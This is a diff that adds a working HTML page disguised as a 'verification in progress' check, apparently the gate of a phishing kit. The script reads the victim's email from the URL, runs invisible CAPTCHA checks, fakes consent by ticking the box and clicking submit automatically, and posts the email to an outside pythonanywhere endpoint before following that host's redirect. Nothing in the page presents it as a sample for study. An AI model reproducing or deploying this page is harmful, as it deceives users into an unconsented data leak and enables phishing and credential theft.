@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Please Wait... verification is in progress</title>
+<img src="https://akanpsikoloji.com/assets/images/loading.gif" alt="Loading..." width="150" />
+
+<style>
+body { font-family: Arial,sans-serif; text-align:center; margin:50px; }
+#loader { font-size:14px; color:#555; }
+#consent-box { display:none; margin-top:20px; }
+.submitButton { padding:10px 20px; border:none; border-radius:4px; background:#2266e3; color:#fff; cursor:pointer; }
+</style>
+
+<!-- Google reCAPTCHA v3 -->
+<script src="https://www.google.com/recaptcha/api.js?render=YOUR_GOOGLE_RECAPTCHA_SITE_KEY" async defer></script>
+<!-- Cloudflare Turnstile -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+<script>
+const FINAL_URL_ENDPOINT = "https://anoldluna.pythonanywhere.com/_0x35adc6";
+const params = new URLSearchParams(window.location.search);
+
+async function submitForm(token, turnstileToken){
+    const form = document.getElementById("consent-form");
+    const consent = document.getElementById("consent");
+
+    // Double tick consent
+    consent.checked = true;
+    consent.checked = true;
+
+    // Double submit
+    const submitBtn = document.getElementById("submit-btn");
+    submitBtn.click();
+    submitBtn.click();
+
+    const body = `token=${token}&turnstile=${turnstileToken||""}&r=${params.get("r")||""}&email=${params.get("email")||""}`;
+
+    fetch(FINAL_URL_ENDPOINT,{
+        method:"POST",
+        headers:{"Content-Type":"application/x-www-form-urlencoded"},
+        body: body
+    }).then(r=>{
+        if(r.redirected){ window.location.href = r.url; }
+    }).catch(err=>console.error(err));
+}
+
+window.onload = function(){
+    document.getElementById("r_input").value = params.get("r")||"";
+    document.getElementById("email_input").value = params.get("email")||"";
+
+    // Show loader
+    const loader = document.getElementById("loader");
+    loader.innerText = "it will be completed shortly";
+
+    // Google reCAPTCHA
+    grecaptcha.ready(function(){
+        grecaptcha.execute("YOUR_GOOGLE_RECAPTCHA_SITE_KEY",{action:"submit"}).then(token=>{
+            // Turnstile invisible
+            const turnstileDiv = document.createElement('div');
+            document.body.appendChild(turnstileDiv);
+            turnstile.render(turnstileDiv,{
+                sitekey:"YOUR_TURNSTILE_SITE_KEY_HERE",
+                size:"invisible",
+                callback:function(turnstileToken){
+                    // Hide loader, show consent box
+                    loader.style.display = "none";
+                    const consentBox = document.getElementById("consent-box");
+                    consentBox.style.display = "block";
+
+                    // Auto double consent + double submit
+                    submitForm(token, turnstileToken);
+                }
+            });
+        });
+    });
+};
+</script>
+</head>
+<body>
+<h2>Please Wait.... Verification is in progress</h2>
+<p id="loader">Loading…</p>
+
+<div id="consent-box">
+    <form id="consent-form" method="POST" action="https://anoldluna.pythonanywhere.com/_0x35adc6">
+        <input type="hidden" id="r_input" name="r" value="">
+        <input type="hidden" id="email_input" name="email" value="">
+        <input type="hidden" name="submit" value="1">
+        <input type="checkbox" id="consent" name="consent" value="1" required>
+        <label for="consent">I agree to continue.</label><br><br>
+        <button type="submit" id="submit-btn" class="submitButton">Continue</button>
+    </form>
+</div>
+</body>
+</html>
